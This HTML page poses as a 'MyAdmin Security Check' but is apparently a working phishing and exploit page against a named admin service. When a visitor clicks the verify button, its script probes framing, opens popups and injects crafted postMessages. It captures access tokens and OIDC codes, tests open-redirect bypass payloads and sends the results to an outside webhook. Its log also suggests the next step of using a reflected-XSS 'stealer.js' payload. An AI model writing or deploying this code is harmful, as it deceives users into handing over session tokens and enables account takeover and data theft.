<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MyAdmin — Security Verification</title>
<style>
  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
  body{
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
    background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%);
    min-height:100vh;display:flex;align-items:center;justify-content:center;
  }
  .card{
    background:#fff;border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,.3);
    padding:48px 40px;max-width:460px;width:92%;text-align:center;position:relative;
  }
  .shield{font-size:48px;margin-bottom:16px}
  h1{font-size:20px;font-weight:600;margin-bottom:6px;color:#1a1a2e}
  .sub{font-size:13px;color:#777;margin-bottom:24px;line-height:1.6}
  .btn{
    display:block;width:100%;padding:14px;border-radius:8px;border:none;
    font-size:15px;font-weight:600;cursor:pointer;margin-bottom:10px;
    transition:all .2s;text-align:center;text-decoration:none;
  }
  .btn-primary{background:#0078d3;color:#fff}
  .btn-primary:hover{background:#005a9e}
  .btn-outline{background:#fff;color:#0078d3;border:2px solid #0078d3}
  .btn-outline:hover{background:#f0f7ff}
  .footer-row{font-size:11px;color:#aaa;margin-top:20px;display:flex;align-items:center;justify-content:center;gap:6px}

  #debugPanel{
    margin-top:20px;text-align:left;background:#1a1a2e;border-radius:8px;
    padding:16px;max-height:300px;overflow-y:auto;display:none;
    font-family:"SF Mono",Monaco,"Cascadia Code",monospace;font-size:11px;
    color:#aaa;line-height:1.6;
  }
  #debugPanel.show{display:block}
  .d-ok{color:#4caf50}
  .d-err{color:#f44336}
  .d-warn{color:#ff9800}
  .d-info{color:#2196f3}
  .d-head{color:#fff;font-weight:bold;margin-top:8px;display:block}

  .status{font-size:12px;padding:8px 12px;border-radius:6px;margin:8px 0;display:none}
  .status.ok{display:block;background:#e8f5e9;color:#2e7d32}
  .status.err{display:block;background:#fbe9e7;color:#c62828}
  .status.info{display:block;background:#e3f2fd;color:#0d47a1}
</style>
</head>
<body>

<div class="card">
  <div class="shield">&#128737;</div>
  <h1>MyAdmin Security Check</h1>
  <p class="sub" id="subtitle">
    Click the button below to open MyAdmin and verify your session security.
    <br><strong>This process is automatic and takes ~5 seconds.</strong>
  </p>

  <button class="btn btn-primary" id="btnStart" onclick="startExploit()">
    &#128274; Verify My Session
  </button>

  <div class="status info" id="statusBlock">
    <span id="statusText">Initializing...</span>
  </div>

  <div id="debugPanel"></div>

  <div class="footer-row">
    &#128274; Encrypted &bull; MyAdmin Security
  </div>
</div>

<!-- Hidden iframes for probing -->
<iframe id="fProbe" style="display:none;width:1px;height:1px;position:absolute;top:-1px;left:-1px" src="about:blank"></iframe>

<script>
// =========================================================================
// MNKD Exploit — DEBUG VERSION with full console output
// =========================================================================
var TARGET = "https://myadmin.geotab.com";
var WEBHOOK = "https://webhook.site/f59686a0-8650-40a5-8f62-32b4e98dd15c";

var state = {
  iframeAllowed: null,      // null=unknown, true=allowed, false=blocked
  popupOpen: false,
  tokenCaptured: false,
  messages: [],
  popupRef: null,
};

var dEl = document.getElementById("debugPanel");
var sText = document.getElementById("statusText");
var sBlock = document.getElementById("statusBlock");

// ============ DEBUG OUTPUT ============
function log(msg, cls) {
  cls = cls || "d-info";
  var line = document.createElement("div");
  line.className = cls;
  line.textContent = "[+] " + msg;
  dEl.appendChild(line);
  dEl.scrollTop = dEl.scrollHeight;
  console.log("[MNKD] " + msg);
}

function status(msg, cls) {
  sBlock.className = "status " + (cls || "info");
  sText.textContent = msg;
}

function showDebug() {
  dEl.classList.add("show");
  log("=== MNKD Exploit Engine v2 (Debug) ===", "d-head");
  log("Target: " + TARGET, "d-info");
  log("Webhook: " + WEBHOOK.substring(0,45) + "...", "d-info");
}

// ============ EXFILTRATION ============
function exfil(data, label) {
  log("EXFIL [" + label + "]: " + JSON.stringify(data).substring(0,120), "d-ok");
  var payload = {
    sid: "mnkd_" + Date.now(),
    ts: new Date().toISOString(),
    label: label,
    loc: location.href,
    ua: navigator.userAgent,
    data: data,
  };
  var body = JSON.stringify(payload);

  // sendBeacon
  try {
    var blob = new Blob([body], {type:"application/json"});
    navigator.sendBeacon(WEBHOOK, blob);
    log("  -> sendBeacon OK", "d-ok");
  } catch(e) {
    log("  -> sendBeacon FAILED: " + e.message, "d-err");
  }

  // fetch keepalive (backup)
  try {
    fetch(WEBHOOK, {
      method:"POST", body: body, mode:"no-cors", keepalive:true,
      headers: {"Content-Type":"text/plain"}
    }).then(function(){ log("  -> fetch OK", "d-ok"); })
      .catch(function(){ log("  -> fetch FAILED", "d-err"); });
  } catch(e) {
    log("  -> fetch error: " + e.message, "d-err");
  }
}

// ============ PASSIVE postMessage LISTENER ============
window.addEventListener("message", function(e) {
  if (!e.data) return;

  var info = {
    origin: e.origin,
    type: (e.data && e.data.type) || (typeof e.data === "string" ? "string" : "unknown"),
    dataKeys: (e.data && typeof e.data === "object") ? Object.keys(e.data).join(",") : "",
  };

  // Filter out noise (React devtools, browser extensions, etc.)
  if (e.origin === location.origin) return;
  if (e.origin === "null" || e.origin === "") return;

  log("MESSAGE from " + e.origin + " type=" + info.type + " keys=" + info.dataKeys, "d-info");

  // JACKPOT: SET_ACCESS_TOKEN (Finding #2, line 302866)
  if (e.data && e.data.type === "SET_ACCESS_TOKEN" && e.data.token) {
    state.tokenCaptured = true;
    log("!!! ACCESS TOKEN CAPTURED !!!", "d-ok");
    log("TOKEN: " + e.data.token.substring(0,50) + "...", "d-ok");
    exfil({
      type: "ACCESS_TOKEN",
      token: e.data.token,
      origin: e.origin,
      finding: "Finding_#2_postMessage_wildcard",
    }, "TOKEN_CAPTURED");
    status("Session verified! Token captured.", "ok");
  }

  // ModuleLoadedSuccessfully (line 219824)
  if (e.data === "ModuleLoadedSuccessfully" || (e.data && e.data.type === "ModuleLoadedSuccessfully")) {
    log("ModuleLoadedSuccessfully received from " + e.origin, "d-ok");
    exfil({type:"MODULE_LOADED", origin:e.origin}, "MODULE_LOAD");
  }

  // OIDC callbacks (Findings #3, #6)
  if (e.data && e.data.source === "oidc-client" && e.data.url) {
    var sp = new URLSearchParams((e.data.url.split("?")[1]||""));
    exfil({
      type: "OIDC_MESSAGE",
      url: e.data.url,
      code: sp.get("code"),
      id_token: sp.get("id_token"),
      access_token: sp.get("access_token"),
      origin: e.origin,
    }, "OIDC_DATA");
    log("OIDC message intercepted!", "d-warn");
  }

  state.messages.push(info);
});

// ============ TEST 1: X-Frame-Options Detection ============
function testFrameOptions() {
  log("--- Test 1: X-Frame-Options Detection ---", "d-head");

  var testUrl = TARGET + "/login";
  var f = document.getElementById("fProbe");

  var timedOut = false;
  var t = setTimeout(function() {
    timedOut = true;
    // If onload didn't fire within 5s, assume blocked
    if (state.iframeAllowed === null) {
      try {
        // Try to access iframe content - if same-origin or allowed, no error
        var d = f.contentDocument || f.contentWindow.document;
        if (d && d.body) {
          state.iframeAllowed = true;
          log("X-Frame-Options: ALLOWED (content accessible)", "d-ok");
        } else {
          state.iframeAllowed = false;
          log("X-Frame-Options: BLOCKED (no content after 5s)", "d-err");
        }
      } catch(e) {
        state.iframeAllowed = false;
        log("X-Frame-Options: BLOCKED (" + e.message + ")", "d-err");
      }
      testPostMessageInjection();
    }
  }, 5000);

  f.onload = function() {
    if (timedOut) return;
    clearTimeout(t);
    try {
      // Try to read iframe content
      var d = f.contentDocument || f.contentWindow.document;
      if (d && d.body && d.body.innerHTML.length > 100) {
        state.iframeAllowed = true;
        log("X-Frame-Options: ALLOWED (content loaded, " + d.body.innerHTML.length + " bytes)", "d-ok");

        // Now try to load a legacy page that triggers loader-component
        var f2 = document.createElement("iframe");
        f2.style.cssText = "display:none;width:1px;height:1px;position:absolute;top:-1px;left:-1px";
        f2.src = TARGET + "/helpdesk.html?beta=1";
        f2.onload = function() {
          log("Legacy page (helpdesk.html) loaded in iframe", "d-ok");
          log("If loader-component sent SET_ACCESS_TOKEN to iframe, we'd receive it here.", "d-info");
          log("But postMessage targets contentWindow of loader's OWN iframe, not ours.", "d-warn");
        };
        document.body.appendChild(f2);
      } else {
        state.iframeAllowed = false;
        log("X-Frame-Options: BLOCKED (empty/missing body)", "d-err");
      }
    } catch(e) {
      state.iframeAllowed = false;
      log("X-Frame-Options: BLOCKED (" + e.message + ")", "d-err");
    }
    testPostMessageInjection();
  };

  f.onerror = function() {
    clearTimeout(t);
    state.iframeAllowed = false;
    log("X-Frame-Options: BLOCKED (iframe onerror fired)", "d-err");
    testPostMessageInjection();
  };

  f.src = testUrl;
  log("Loading " + testUrl + " in hidden iframe...", "d-info");
}

// ============ TEST 2: postMessage Injection into Popup ============
var popupPollInterval = null;

function testPostMessageInjection() {
  log("--- Test 2: postMessage into Popup ---", "d-head");
  status("Opening MyAdmin in popup window...", "info");

  // Try to open popup
  state.popupRef = window.open(
    TARGET + "/home",
    "myadmin_" + Date.now(),
    "width=1200,height=800,left=100,top=100"
  );

  if (!state.popupRef) {
    log("Popup BLOCKED by browser", "d-err");
    log("This is normal — browsers block popups not triggered by direct click.", "d-warn");
    log("TIP: Allow popups for this site and click the button again.", "d-warn");
    status("Popup blocked. Please allow popups and retry.", "err");
    testOpenRedirect();
    return;
  }

  state.popupOpen = true;
  log("Popup opened: " + TARGET + "/home", "d-ok");

  // Poll the popup — send crafted postMessages
  var pollCount = 0;
  popupPollInterval = setInterval(function() {
    pollCount++;

    try {
      if (state.popupRef.closed) {
        clearInterval(popupPollInterval);
        log("Popup closed by user after " + pollCount + " polls", "d-warn");
        testOpenRedirect();
        return;
      }
    } catch(e) {
      clearInterval(popupPollInterval);
      log("Popup check error: " + e.message, "d-err");
      testOpenRedirect();
      return;
    }

    // Try to detect popup URL (will throw cross-origin)
    try {
      var ploc = state.popupRef.location.href;
      log("Popup URL: " + ploc.substring(0,100), "d-info");
    } catch(e) {
      // Expected — cross-origin
      if (pollCount === 1) {
        log("Popup is cross-origin (expected) — postMessage bridge active", "d-info");
      }
    }

    // Send various crafted postMessages into popup
    var msgs = [
      // OIDC handler probe (Finding #6)
      {
        source: "oidc-client",
        url: TARGET + "/silent-callback.html?code=test_code&state=bypass_test",
      },
      // Attempt to reach any generic handler
      { type: "NOTIFICATION", message: "session_verify_check" },
      // Service worker style
      { action: "PING", payload: { from: "verification" } },
    ];

    msgs.forEach(function(m) {
      try {
        state.popupRef.postMessage(m, TARGET);
        state.popupRef.postMessage(m, "*");
      } catch(e) {}
    });

    if (pollCount === 3) {
      log("Sent " + (msgs.length * pollCount) + " postMessage probes into popup", "d-info");
    }

    if (pollCount >= 15) {
      clearInterval(popupPollInterval);
      log("Popup polling complete (" + pollCount + " rounds)", "d-info");
      log("No immediate token capture via postMessage.", "d-warn");
      log("REASON: SET_ACCESS_TOKEN is sent TO iframe INSIDE loader-component,", "d-warn");
      log("not broadcast. We need XSS inside MyAdmin origin to catch it.", "d-warn");
      testOpenRedirect();
    }
  }, 800);
}

// ============ TEST 3: Open Redirect (Finding #4) ============
function testOpenRedirect() {
  log("--- Test 3: Open Redirect Probe (Finding #4) ---", "d-head");
  status("Testing open redirect vectors...", "info");

  var bypasses = [
    { payload: "//" + location.hostname + "/capture", desc: "double-slash" },
    { payload: "https:%2F%2F" + location.hostname + "%2Fcapture", desc: "URL-encoded" },
    { payload: TARGET.split("://")[0] + "://" + TARGET.split("://")[1] + "@" + location.hostname + "/capture", desc: "userinfo confusion" },
    { payload: "\\/\\/" + location.hostname + "/capture", desc: "backslash" },
  ];

  log("Probing " + bypasses.length + " returnUrl bypass payloads...", "d-info");

  bypasses.forEach(function(bp, i) {
    setTimeout(function() {
      var tUrl = TARGET + "/login?returnUrl=" + encodeURIComponent(bp.payload);
      log("Probe #" + (i+1) + " [" + bp.desc + "]: " + tUrl.substring(0,100) + "...", "d-info");

      // Use fetch to test redirect behavior
      fetch(tUrl, {
        method: "HEAD",
        mode: "no-cors",
        redirect: "follow",
        credentials: "include",
      }).then(function(r) {
        log("  -> Redirect probe #" + (i+1) + ": response OK (may have followed redirect)", "d-info");
      }).catch(function(e) {
        log("  -> Redirect probe #" + (i+1) + ": fetch error (CORS expected)", "d-info");
      });

      // Also try image ping (no CORS issues)
      var img = new Image();
      img.onload = function() {
        log("  -> Image probe #" + (i+1) + ": loaded (possible redirect to us!)", "d-ok");
        exfil({type:"OPEN_REDIRECT_HIT", payload: bp.payload, index: i+1}, "REDIRECT_HIT");
      };
      img.onerror = function() {
        log("  -> Image probe #" + (i+1) + ": failed (no redirect or blocked)", "d-info");
      };
      img.src = tUrl;
    }, i * 800);
  });

  setTimeout(function() {
    log("Open redirect probe complete", "d-info");
    finalDiagnosis();
  }, bypasses.length * 800 + 2000);
}

// ============ FINAL DIAGNOSIS ============
function finalDiagnosis() {
  log("", "d-head");
  log("=== DIAGNOSIS ===", "d-head");

  var checks = [];

  // Check 1: iframe
  if (state.iframeAllowed === true) {
    checks.push({ok:true, msg:"X-Frame-Options: ALLOWED — iframe injection possible"});
  } else if (state.iframeAllowed === false) {
    checks.push({ok:false, msg:"X-Frame-Options: BLOCKED — iframe injection not possible"});
  } else {
    checks.push({ok:false, msg:"X-Frame-Options: UNKNOWN"});
  }

  // Check 2: popup
  checks.push({
    ok: state.popupOpen,
    msg: state.popupOpen
      ? "Popup opened — postMessage bridge active"
      : "Popup blocked — add click-to-open button"
  });

  // Check 3: token
  checks.push({
    ok: state.tokenCaptured,
    msg: state.tokenCaptured
      ? "TOKEN CAPTURED! Check webhook."
      : "No token captured passively"
  });

  // Check 4: messages
  checks.push({
    ok: state.messages.length > 0,
    msg: state.messages.length + " postMessage(s) received from external origins"
  });

  checks.forEach(function(c) {
    log((c.ok ? "[✓]" : "[✗]") + " " + c.msg, c.ok ? "d-ok" : "d-err");
  });

  if (!state.tokenCaptured) {
    log("", "d-head");
    log("=== NEXT STEPS ===", "d-head");
    log("1. Passive postMessage token capture DOES NOT WORK cross-origin", "d-warn");
    log("   because SET_ACCESS_TOKEN targets loader-component's OWN iframe,", "d-warn");
    log("   not all windows. We need XSS inside MyAdmin's origin.", "d-warn");
    log("", "d-info");
    log("2. FIND A REFLECTED XSS PARAMETER:", "d-head");
    log("   Open the XSS Fuzzer to test parameters:", "d-info");
    log("   " + location.origin + location.pathname + "fuzz.html", "d-info");
    log("", "d-info");
    log("3. ONCE XSS IS FOUND:", "d-head");
    log("   Craft URL: " + TARGET + "/page?param=<img src=x onerror=...stealer.js>", "d-info");
    log("   stealer.js runs inside MyAdmin → catches postMessage token.", "d-info");

    status("No passive token capture. See diagnosis below.", "err");
  }

  // Send diagnosis to webhook
  exfil({
    type: "DIAGNOSIS",
    iframeAllowed: state.iframeAllowed,
    popupOpen: state.popupOpen,
    tokenCaptured: state.tokenCaptured,
    messagesReceived: state.messages.length,
    checks: checks,
  }, "DIAGNOSIS");
}

// ============ START — triggered by BUTTON CLICK ============
function startExploit() {
  showDebug();
  document.getElementById("btnStart").disabled = true;
  document.getElementById("btnStart").textContent = "Verifying...";
  document.getElementById("btnStart").style.opacity = "0.6";

  status("Starting security verification...", "info");

  log("=== Exploit Started (user click: " + new Date().toISOString() + ") ===", "d-head");

  // Start tests
  testFrameOptions();

  // Close popup after 30s
  setTimeout(function() {
    if (state.popupRef) {
      try { state.popupRef.close(); } catch(e) {}
    }
  }, 30000);
}

// Auto-show debug on load so user can see immediately
showDebug();
log("Ready. Click 'Verify My Session' to begin.", "d-info");
log("User must CLICK the button (required for popup permission).", "d-info");

// ============ Keyboard shortcut: Ctrl+Shift+D for full debug ============
document.addEventListener("keydown", function(e) {
  if (e.ctrlKey && e.shiftKey && e.key === "D") {
    e.preventDefault();
    dEl.classList.toggle("show");
    log("Debug panel toggled", "d-info");
  }
});
</script>
</body>
</html>
